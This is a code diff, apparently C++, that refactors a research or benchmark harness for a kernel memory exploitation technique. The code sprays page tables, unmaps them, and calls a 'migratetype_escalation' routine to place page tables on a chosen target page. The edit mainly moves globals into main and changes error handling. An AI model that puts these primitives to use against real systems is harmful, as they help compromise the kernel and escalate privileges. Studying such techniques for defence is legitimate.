@@ -25,15 +25,6 @@ inline constexpr std::size_t kX86_64PageTableSpan = 1ULL << 21; // 2 MiB
 #define NR_PAGE_TABLES_SPRAY 63000UL
 #define SPRAY_START 0x100000000UL
 
-static int fd_spray;
-static void* file_ptr;
-static unsigned long file_phys;
-
-static void* pageblock;
-
-static void* target;
-static unsigned long target_phys;
-
 struct spray_args_t {
     void* start;
     int fd;
@@ -59,17 +50,19 @@ int spray_tables(void* ctx) {
     return spray_tables(*static_cast<spray_args_t*>(ctx));
 }
 
-void unspray_tables() {
-    for(unsigned i = 1; i < NR_PAGE_TABLES_SPRAY; ++i) {
-        void* addr = (void*)(SPRAY_START + kX86_64PageTableSpan * i);
+int unspray_tables(const spray_args_t& args) {
+    for(unsigned i = 1; i < args.nr_tables; ++i) {
+        void* addr = (void*)(args.start + kX86_64PageTableSpan * i);
         if(munmap(addr, PAGE_SIZE)) {
             printf("Failed to unspray tables\n");
-            exit(EXIT_FAILURE);
+            return -1;
         }
     }
+
+    return 0;
 }
 
-int main(void) {
+int main() {
     rubench_open();
 
 
@@ -77,6 +70,15 @@ int main(void) {
     long long total_time = 0;
     int num_fails        = 0;
     const char* buf      = "ffffffffffffffff";
+
+    int fd_spray;
+    void* file_ptr;
+    unsigned long file_phys;
+
+    void* pageblock;
+
+    void* target;
+    unsigned long target_phys;
 
     for(int round = 0; round < num_rounds; round++) {
         printf("Round %d\n", round);
@@ -104,7 +106,7 @@ int main(void) {
         };
 
         migratetype_escalation(bait_ptr, 9, spray_tables, &spray_args);
-        unspray_tables();
+        unspray_tables(spray_args);
 
         // Move the target as next candidate for page table allocation
         munlock(target, PAGE_SIZE);
